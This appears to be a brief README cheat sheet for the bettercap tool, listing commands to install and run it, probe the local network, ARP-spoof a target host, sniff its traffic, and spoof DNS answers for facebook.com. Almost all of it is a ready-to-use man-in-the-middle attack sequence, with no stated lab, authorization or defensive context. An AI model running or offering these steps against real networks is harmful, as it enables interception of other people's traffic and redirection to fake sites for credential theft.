# bettercap-cmd

# Install
```
sudo apt install bettercap
```

# Run
```
sudo bettercap
```

# Available Devices
```
net.probe on

net.show

```

# Sniff 
```
set arp.spoof.targets 192.168.0.ip

arp.spoof on

net.sniff on

```

# DNS Spoof
```
set dns.spoof.domains facebook.com
dns.spoof on
```
